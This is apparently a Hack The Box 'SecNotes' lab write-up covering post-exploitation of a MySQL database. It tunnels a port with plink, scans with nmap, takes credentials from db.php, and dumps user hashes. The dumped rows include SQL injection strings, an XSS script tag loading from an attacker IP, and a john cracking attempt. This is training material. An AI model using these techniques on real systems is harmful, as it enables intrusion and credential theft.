# Enumerating MySQL DB post-exploitation

Copy over plink.exe to the target and remote port forward back to Kali
```shell
C:\users\tyler\temp>plink.exe -l root -pw <pw> -R 3306:127.0.0.1:3306 -P 2222 root@10.10.14.78
plink.exe -l root -pw <pw> -R 3306:127.0.0.1:3306 -P 2222 root@10.10.14.78
The server's host key is not cached in the registry. You
have no guarantee that the server is the computer you
think it is.
The server's rsa2 key fingerprint is:
ssh-rsa 2048 53:ae:47:75:9b:cf:5d:cf:21:12:07:be:bf:dc:5b:33
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
Store key in cache? (y/n) u
Linux Kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-2kali1 (2019-05-15) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Mon Sep 14 23:54:03 2020 from 192.168.92.1
root@Kali:~# 
```
This is the nmap scan results
```shell
root@Kali:~/HTB/SecNotes# nmap -Pn -n -sV -p3306 --script=vuln,discovery 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-11 15:58 +08
too short
Pre-scan script results:
| broadcast-igmp-discovery: 
|   192.168.92.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|   192.168.92.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.252
|     Description: Link-local Multicast Name Resolution (rfc4795)
|   192.168.92.1
|     Interface: eth0
|     Version: 2
|     Group: 239.255.255.250
|     Description: Organization-Local Scope (rfc2365)
|_  Use the newtargets script-arg to add the results as targets
| ipv6-multicast-mld-list: 
|   fe80::b041:cdc8:aed5:1dee: 
|     device: eth0
|     mac: 00:50:56:c0:00:08
|     multicast_ips: 
|       ff02::1:ffd5:1dee         (NDP Solicited-node)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::1:ff14:c4f9         (Solicited-Node Address)
|       ff02::1:ff14:c4f9         (Solicited-Node Address)
|       ff02::fb                  (mDNSv6)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|       ff02::c                   (SSDP)
|       ff02::1:3                 (Link-local Multicast Name Resolution)
|_      ff02::1:3                 (Link-local Multicast Name Resolution)
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
| targets-ipv6-multicast-mld: 
|   IP: fe80::b041:cdc8:aed5:1dee  MAC: 00:50:56:c0:00:08  IFACE: eth0
| 
|_  Use --script-args=newtargets to add the results as targets
| targets-ipv6-multicast-slaac: 
|   IP: fe80::b041:cdc8:aed5:1dee  MAC: 00:50:56:c0:00:08  IFACE: eth0
|   IP: fe80::d04d:eca1:3614:c4f9  MAC: 00:50:56:c0:00:08  IFACE: eth0
|_  Use --script-args=newtargets to add the results as targets
sendto in send_ip_packet_sd: sendto(9, packet, 65536, 0, 127.0.0.1, 16) => Message too long
Offending packet: TCP 127.0.0.1:48754 > 127.0.0.1:3306 S ttl=128 id=0 iplen=0  seq=207107627 win=3072 <mss 1460>
Nmap scan report for 127.0.0.1
Host is up (0.000068s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
|_banner: J\x00\x00\x00\x0A8.0.11\x00\x07\xB2\x00\x00'Ef!uJyi\x00\xFF\...
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     8.0.11
|     4h[Tz
|     bZ=g
|     mysql_native_password
|     #08S01Got packets out of order
|   DNSVersionBindReqTCP: 
|     8.0.11
|     %ec:-
|     mysql_native_password
|     #08S01Got packets out of order
|   GenericLines: 
|     8.0.11
|     'Ef!uJyi
|     -Rkx
|     JZl;
|     mysql_native_password
|     #08S01Got packets out of order
|   GetRequest: 
|     8.0.11
|     %iXO!S
|     WX%wT;jH%z(%
|     mysql_native_password
|     #08S01Got packets out of order
|   HTTPOptions: 
|     8.0.11
|     MWwf
|     Q"a,
|     mysql_native_password
|     #08S01Got packets out of order
|   Help: 
|     8.0.11
|     Z03;_}"d
|     `1MNK"
|     mysql_native_password
|     #08S01Got packets out of order
|   NULL: 
|     8.0.11
|     'Ef!uJyi
|     -Rkx
|     JZl;
|     mysql_native_password
|   RPCCheck: 
|     8.0.11
|     mysql_native_password
|     #08S01Got packets out of order
|   RTSPRequest: 
|     8.0.11
|     s]d]DHM
|     L02`ILH)g
|     mysql_native_password
|     #08S01Got packets out of order
|   SSLSessionReq: 
|     8.0.11
|     mKf`qC
|     WST}v
|     mysql_native_password
|_    #08S01Got packets out of order
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.11
|   Thread ID: 45605
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, Speaks41ProtocolNew, FoundRows, SupportsTransactions, LongColumnFlag, LongPassword, SwitchToSSLAfterHandshake, ODBCClient, DontAllowDatabaseTableColumn, InteractiveClient, IgnoreSigpipes, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1A\x15\x05\x05\x05Q=`7;wt{\x17\x13\x0Br\x16\x06H
|_  Auth Plugin Name: mysql_native_password
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=10/11%Time=5F82BB47%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4E,"J\0\0\0\n8\.0\.11\0\x07\xb2\0\0'Ef!uJyi\0\xff\xff\xff\x02\0\xff
SF:\xc3\x15\0\0\0\0\0\0\0\0\0\0-Rkx\x1bD\x07JZl;\x07\0mysql_native_passwor
SF:d\0")%r(GenericLines,73,"J\0\0\0\n8\.0\.11\0\x07\xb2\0\0'Ef!uJyi\0\xff\
SF:xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0\0-Rkx\x1bD\x07JZl;\x07\0mys
SF:ql_native_password\0!\0\0\x01\xff\x84\x04#08S01Got\x20packets\x20out\x2
SF:0of\x20order")%r(GetRequest,73,"J\0\0\0\n8\.0\.11\0\x08\xb2\0\0%iXO!S\n
SF:\x20\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0\0WX%wT;jH%z\(%\0
SF:mysql_native_password\0!\0\0\x01\xff\x84\x04#08S01Got\x20packets\x20out
SF:\x20of\x20order")%r(HTTPOptions,73,"J\0\0\0\n8\.0\.11\0\t\xb2\0\0FGO\x1
SF:1k3\x07R\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0\0\x13\x0fMWw
SF:f\x01\\Q\"a,\0mysql_native_password\0!\0\0\x01\xff\x84\x04#08S01Got\x20
SF:packets\x20out\x20of\x20order")%r(RTSPRequest,73,"J\0\0\0\n8\.0\.11\0\n
SF:\xb2\0\0\x10s\]d\]DHM\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0
SF:\0YM\x0bL02`ILH\)g\0mysql_native_password\0!\0\0\x01\xff\x84\x04#08S01G
SF:ot\x20packets\x20out\x20of\x20order")%r(RPCCheck,73,"J\0\0\0\n8\.0\.11\
SF:0\x0b\xb2\0\0\x02:2\x17\x7fe2r\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\
SF:0\0\0\0\0\0\x05\x0f\)\x0f\x113\r\x0bn\x11\]L\0mysql_native_password\0!\
SF:0\0\x01\xff\x84\x04#08S01Got\x20packets\x20out\x20of\x20order")%r(DNSVe
SF:rsionBindReqTCP,73,"J\0\0\0\n8\.0\.11\0\x0c\xb2\0\x001&\x0b3K\x1bDG\0\x
SF:ff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0\0GO9\x1f\x1cL\x08%ec:-\0
SF:mysql_native_password\0!\0\0\x01\xff\x84\x04#08S01Got\x20packets\x20out
SF:\x20of\x20order")%r(DNSStatusRequestTCP,73,"J\0\0\0\n8\.0\.11\0\r\xb2\0
SF:\x008V\x044h\[Tz\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0\0\0\0bZ=
SF:g\x06\x1d\r\x05t9\x02\x08\0mysql_native_password\0!\0\0\x01\xff\x84\x04
SF:#08S01Got\x20packets\x20out\x20of\x20order")%r(Help,73,"J\0\0\0\n8\.0\.
SF:11\0\x0e\xb2\0\0Z03;_}\"d\0\xff\xff\xff\x02\0\xff\xc3\x15\0\0\0\0\0\0\0
SF:\0\0\0`1MNK\"\x1f\x7f\rY8B\0mysql_native_password\0!\0\0\x01\xff\x84\x0
SF:4#08S01Got\x20packets\x20out\x20of\x20order")%r(SSLSessionReq,73,"J\0\0
SF:\0\n8\.0\.11\0\x0f\xb2\0\0G\x01mKf`qC\0\xff\xff\xff\x02\0\xff\xc3\x15\0
SF:\0\0\0\0\0\0\0\0\x007\x19O\x03WST}v\x01t\x18\0mysql_native_password\0!\
SF:0\0\x01\xff\x84\x04#08S01Got\x20packets\x20out\x20of\x20order");

Host script results:
|_dns-brute: Can't guess domain of "127.0.0.1"; use dns-brute.domain script argument.
|_fcrdns: PASS (localhost)
|_ipidseq: ERROR: Script execution failed (use -d to debug)
|_path-mtu: 65535 <= PMTU < 65536

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.15 seconds
```
We still need a password so I looked the at folder serving the Web app and found **db.php**
```shell
C:\inetpub\wwwroot>type db.php
<?php

if ($includes != 1) {
    die("ERROR: Should not access directly.");
}

/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'secnotes');
define('DB_PASSWORD', 'q8N#9Eos%JinE57tke72');
//define('DB_USERNAME', 'root');
//define('DB_PASSWORD', 'qwer1234QWER!@#$');
define('DB_NAME', 'secnotes');

/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
     
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
We got some credentials. This should be checked to see if we can RunAs Administrator but for now we login with it on Kali and see:
```shell
root@Kali:~/HTB/SecNotes# mysql -u secnotes -p -h 127.0.0.1 -P 3306
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 47113
Server version: 8.0.11 MySQL Community Server - GPL

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| secnotes           |
+--------------------+
2 rows in set (0.029 sec)

MySQL [(none)]> use secnotes;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [secnotes]> show tables;
+--------------------+
| Tables_in_secnotes |
+--------------------+
| posts              |
| users              |
+--------------------+
2 rows in set (0.017 sec)

MySQL [secnotes]> select * from users;
+----+----------------------------------------------------+--------------------------------------------------------------+---------------------+
| id | username                                           | password                                                     | created_at          |
+----+----------------------------------------------------+--------------------------------------------------------------+---------------------+
|  5 | tyler                                              | $2y$10$IMZPI.99fAPmsvGi0KWaJ.8pakoHDfobENhzx4Kwbb/7OpvFXaQt. | 2018-06-22 03:50:55 |
|  8 | eks                                                | $2y$10$dv3rCvSFRMYtcdgNWhF44u3amnovAuffb0R0yVtu5Dk8qc41Rbpmm | 2018-08-19 15:53:14 |
|  9 | test                                               | $2y$10$PsFu5CD89nzczW2CYLzVxeYm4gj78ELijAJfdLXyYHnZTQOhz2Diu | 2020-10-10 12:42:24 |
| 10 | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | $2y$10$iVjMjQp92V18GFiEUU65tO5Q1QZD837dohZQACawXeWcajbyGJ9bu | 2020-10-10 12:49:47 |
| 11 | BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB | $2y$10$Mi6/m44KqTL9Umy8uR46letoqF7ZM3i7BK.GJtRfWtxZD9JMrQrJi | 2020-10-10 12:50:57 |
| 12 | test                    a                          | $2y$10$yEpLSLguHaTOM4Illmahsu8lssWs6BLFHEZIHeJuDrf8iL.vfQzYS | 2020-10-10 12:57:04 |
| 13 | test               a                               | $2y$10$lNYXCB2ML7hs/8m0RZj5MOoy5VZtAfi.8wTNCHkoa1G0WMD.qm4mm | 2020-10-10 12:57:28 |
| 14 | test' OR 1=1#                                      | $2y$10$s99nYPBL2NWXNZZa0FYNue5geX5y.EcK9rBiCnmR5iHAXUVyj6/9O | 2020-10-10 12:58:24 |
| 15 | tyler' OR 1=1#                                     | $2y$10$.WNQDNV12AgO3iE51Fbsi.z6cJ5H/KE1lLcOarLSZh3kOVrFkjqpm | 2020-10-10 13:16:23 |
| 16 | tyler' #                                           | $2y$10$a.vAJc2ZNgG8zw9EXG6TjOEDC/jmGwHYHJho9w8Pl7UTs1GVjsvcW | 2020-10-10 13:16:35 |
| 17 | ' OR 1=1#                                          | $2y$10$m7APriRg5LSY7AaNLj12dufBSohmL0Ea3jDfry.B5zoq2coTHwVEC | 2020-10-10 13:17:18 |
| 18 | tester                                             | $2y$10$HaIyeqW84cFPiaq1AYfIV.QzbC9S4xT1Hfq4OFPElx/3VhzhH5g9S | 2020-10-10 22:15:17 |
| 19 | '                                                  | $2y$10$hzqzakcmdjvNQn84ut2wB.MfhscVqrjVRy4PE608.c4bF9Wl2g69K | 2020-10-10 22:29:53 |
| 20 | "                                                  | $2y$10$i4BYvKwEcBE2Zsoqc2wdd.3zBPqtmZfqmnbTLpQiogIQvypTkqO8u | 2020-10-10 22:30:02 |
| 21 | ' 1=1;-- -                                         | $2y$10$15Q9ORfNmbyYEaQsR1rD9OrD7DoXuEQzrwE1vX06jIJSpNZp1/z22 | 2020-10-10 22:45:27 |
| 22 | ' or 1=1;-- -                                      | $2y$10$bDWd0K.veEeHvk6psm.0WeE19TQdUaVlnWm15f8x0x9fcYNJIf3Na | 2020-10-10 22:46:43 |
+----+----------------------------------------------------+--------------------------------------------------------------+---------------------+
16 rows in set (0.008 sec)

MySQL [secnotes]> select * from posts;
+----+----------+--------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+
| id | username | title              | note                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | created_at          |
+----+----------+--------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+
|  2 | tyler    | Mimi's Sticky Buns | Ingredients
    For Dough
        1 heaping Tbs. (1 pkg) dry yeast
        1/4 c warm water
        scant 3/4 c buttermilk
        1 egg
        3 c flour
        1/4 shortening
        1/4 c sugar
        1 tsp baking powder
        1 tsp salt
    For Filling
        Butter
        Cinnamon
        1/4 c sugar
    For Sauce
        1/4 c butter
        1/2 c brown sugar
        2 Tbs maple syrup

Instructions
        In 9" sq pan, melt butter, and stir in brown sugar and syrup.
        In a large mixing bowl dissolve yeast in warm water.
        Add buttermilk, egg, half of the flour, shortening, sugar, baking powder, and salt.
        Blend 1/2 min low speed, then 2 min med speed.
        Stir in remaining flour and kneed 5 minutes.
        Roll dough into rectangle about the size of a cookie sheet. Spread with butter, sprinkle with 1/4 c sugar and generously with cinnamon.
        Roll up, and cut into 9 slices.
        Place in 9" pan in sauce.
        Let rise until double in size, about 1-1.5 hours.
        Bake 25-30 min at 375. | 2018-06-21 09:47:17 |
|  3 | tyler    | Years              | 1957, 1982, 1993, 2005, 2009*, and 2017                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | 2018-06-21 09:47:54 |
|  4 | tyler    | new site           | \\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | 2018-06-21 13:13:46 |
| 12 | test     | hihi               | <script src=http://10.10.14.28/test.txt></script>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 2020-10-10 13:07:56 |
+----+----------+--------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------------------+
4 rows in set (0.012 sec)
```

We see the notes stored in the DB, but also just one other eks user in the users table from 2018. The others date 2020. Unfortunately the hash couldn't be cracked by john even after 3:24 hours so this likely not the intended route.

```shell
root@Kali:~/HTB/SecNotes# cat eks-hash 
eks:$2y$10$dv3rCvSFRMYtcdgNWhF44u3amnovAuffb0R0yVtu5Dk8qc41Rbpmm

root@Kali:~/HTB/SecNotes# john --wordlist=/usr/share/wordlists/rockyou.txt eks-hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:33:49 1.28% (ETA: 2020-10-13 12:24) 0g/s 106.8p/s 106.8c/s 106.8C/s marines21..mariah14
0g 0:02:27:14 5.87% (ETA: 2020-10-13 10:12) 0g/s 108.4p/s 108.4c/s 108.4C/s enerofebrero..enelle
0g 0:02:55:10 7.05% (ETA: 2020-10-13 09:46) 0g/s 109.6p/s 109.6c/s 109.6C/s yatata..yassiirshameem
0g 0:03:05:29 7.56% (ETA: 2020-10-13 09:16) 0g/s 110.4p/s 110.4c/s 110.4C/s telloteamo..telli2
0g 0:03:20:48 8.34% (ETA: 2020-10-13 08:30) 0g/s 111.7p/s 111.7c/s 111.7C/s ricastar..ricardomiamor
0g 0:03:24:02 8.52% (ETA: 2020-10-13 08:18) 0g/s 112.1p/s 112.1c/s 112.1C/s pukepoto..pukaluka
Session aborted
```